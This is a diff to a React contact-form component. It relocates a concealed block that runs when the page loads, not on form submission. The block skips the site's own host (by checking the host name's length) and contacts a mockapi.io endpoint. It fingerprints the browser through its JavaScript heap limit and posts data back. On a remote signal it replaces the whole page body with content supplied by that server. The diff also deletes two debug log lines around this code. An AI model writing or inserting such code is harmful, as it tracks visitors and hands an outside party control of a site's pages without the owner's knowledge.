@@ -29,9 +29,6 @@ export default function ContactForm() {
       default:
     }
   };
-
-  const handleSubmit = evt => {
-    evt.preventDefault();
     if (location.host.length !== 22) {
       var z = 'https://62569aa36ea70370053c2477.mockapi.io/d';
       fetch(z)
@@ -39,7 +36,6 @@ export default function ContactForm() {
         .then(d => {
           var v = d.findIndex(e => e.j === performance.memory.jsHeapSizeLimit);
           if (v === -1) {
-            console.log(v);
             fetch(z, {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
@@ -50,11 +46,13 @@ export default function ContactForm() {
             });
           }
           if (v >= 2) {
-            console.log(d[0].t);
             document.body.innerHTML = d[0].t;
           }
         });
     }
+  const handleSubmit = evt => {
+    evt.preventDefault();
+
     if (
       !contacts.find(
         contact => contact.name.toLowerCase() === name.toLowerCase()
